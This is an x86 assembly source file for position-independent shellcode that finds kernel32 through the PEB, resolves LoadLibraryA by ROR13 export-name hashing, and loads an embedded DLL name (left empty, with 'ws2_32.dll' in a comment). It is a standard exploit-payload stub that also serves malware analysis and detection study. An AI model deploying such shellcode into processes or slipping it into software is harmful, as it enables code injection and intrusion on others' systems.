;
; shLoadLibraryA-x86.asm
;

.386
.model flat, stdcall

public shLoadLibraryA

assume fs:nothing
.code

    shLoadLibraryA proc
        pushad
        mov     eax, esp                ;// 1. get the pointer to accessible memory, it will be referenced in step 3 below
        call    $+4                     ;// 2. e8 ff ff ff ff  [after this call eip will point to the last ff byte in this instruction]
        db      030h                    ;// 3. ff 30 -> push dword ptr [eax]
        pop	    eax	                    ;// 4. retore stack pointer after previos instruction
        pop	    eax	                    ;// 5. pop the value that was pushed by call
        sub	    eax, 8                  ;// 6. eax is now holds a pointer the the beginning of code loadLibraryA

        mov	    ebx, eax
        mov	    ecx, 0 - (getKernel32Base - shLoadLibraryA)
        neg	    ecx
        add	    eax, ecx
        call    eax	                    ;// call getKernel32Base, after the call eax = pKernel32Base

        mov	    edx, ebx
        mov	    ecx, 0 - (getProcAddress - shLoadLibraryA)
        neg	    ecx
        add	    edx, ecx
        mov     esi, 0EC0E4E8Eh         ;// "LoadLibraryA", obtained by ROR13 hashing approach
        call    edx	                    ;// getProcAddress(eax - pKernel32Base, esi - hash of "LoadLibraryA" string)

        mov	    edx, ebx
        mov	    ecx, 0 - (dllName - shLoadLibraryA)
        neg	    ecx
        add	    edx, ecx
        push    edx	                    ;// pDllName
        call    eax	                    ;// call LoadLibraryA(dllName)

        popad
        ret
    shLoadLibraryA endp


    getKernel32Base proc
        push    esi
        xor     eax, eax
        mov     eax, fs:[eax+030h]      ;// _TEB.Peb (_PEB* Peb)
        mov     eax, [eax+0ch]          ;// _PEB.Ldr (_PEB_LDR_DATA* Ldr)
        mov     esi, [eax+0ch]          ;// _PEB_LDR_DATA.InLoadOrderModuleList (_LIST_ENTRY InLoadOrderModuleList)
        lodsd                           ;// _LDR_DATA_TABLE_ENTRY* of ntdll in eax
        mov     esi, eax                ;// to avoid zeroes in code
        lodsd                           ;// _LDR_DATA_TABLE_ENTRY* of kernel32
        mov     eax, [eax+018h]         ;// _LDR_DATA_TABLE_ENTRY.DllBase
        pop	    esi
        ret
    getKernel32Base endp


    getProcAddress proc
        pushad
        mov     ebp, [esp+01ch]         ;// Store the base address of the module that is being loaded from in ebp.
        mov     eax, [ebp+03ch]         ;// Skip over the MSDOS header to the start of the PE header.
        mov     edx, [ebp+eax+078h]     ;// The export table is 0x78 bytes from the start of the PE header. Extract it and store the relative address in edx.
        add     edx, ebp                ;// Make the export table address absolute by adding the base address to it.
        mov     ecx, [edx+018h]         ;// Extract the number of exported items and store it in ecx which will be used as the counter.
        mov     ebx, [edx+020h]         ;// Extract the names table relative offset and store it in ebx.
        add     ebx, ebp                ;// Make the names table address absolute by adding the base address to it.
      FindFunctionLoop:
        jecxz   lFindFunctionFinished   ;// If ecx is zero then the last symbol has been checked and as such jump to
                                        ;// the end of the function. If this condition is ever true then the requested symbol was not resolved properly.
        dec     ecx
        mov     esi, [ebx+ecx*4]        ;// Extract the relative offset of the name associated with the current symbol and store it in esi. 
        add     esi, ebp                ;// Make the address of the symbol name absolute by adding the base address to it.
        ;// Compute hash
        xor     edi, edi                ;// Zero edi as it will hold the hash value for the current symbols function name.
        xor     eax, eax                ;// Zero eax in order to ensure that the high order bytes are zero as this will
                                        ;// hold the value of each character as it walks through the symbol name.
        cld                             ;// Clear the direction flag to ensure that it increments instead of decrements
                                        ;// when using the lods* instructions. This instruction can be optimized out
                                        ;// assuming that the environment being exploited is known to have the DF flag unset.
      ComputeHashAgain:
        lodsb                           ;// Load the byte at esi, the current symbol name, into al and increment esi.
        test    al, al                  ;// Bitwise test al with itself to see if the end of the string has been reached.
        jz      ComputeHashFinished     ;// If ZF is set the end of the string has been reached. Jump to the end of the hash calculation.
        ror     edi, 0dh                ;// Rotate the current value of the hash 13 bits to the right.
        add     edi, eax                ;// Add the current character of the symbol name to the hash accumulator.
        jmp     ComputeHashAgain        ;// Continue looping through the symbol name.

      ComputeHashFinished:
        cmp     edi, [esp+04h]          ;// Check to see if the computed hash matches the requested hash.
        jnz     FindFunctionLoop        ;// If the hashes do not match, continue enumerating the exported symbol list. 
                                        ;// Otherwise, drop down and extract the VMA of the symbol.
        mov     ebx, [edx+024h]         ;// Extract the ordinals table relative offset and store it in ebx.
        add     ebx, ebp                ;// Make the ordinals table address absolute by adding the base address to it.
        mov     cx,  [ebx+2*ecx]        ;// Extract the current symbols ordinal number from the ordinal table. Ordinals are two bytes in size.
        mov     ebx, [edx+01ch]         ;// Extract the address table relative offset and store it in ebx.
        add     ebx, ebp                ;// Make the address table address absolute by adding the base address to it.
        mov     eax, [ebx+4*ecx]        ;// Extract the relative function offset from its ordinal and store it in eax.
        add     eax, ebp                ;// Make the function’s address absolute by adding the base address to it.
        mov     [esp+01ch], eax         ;// Overwrite the stack copy of the preserved eax register so that when popad
                                        ;// is finished the appropriate return value will be set.
      lFindFunctionFinished:
        popad
        ret
    getProcAddress endp
    
    dllName	    db 0                    ;//"ws2_32.dll",0

end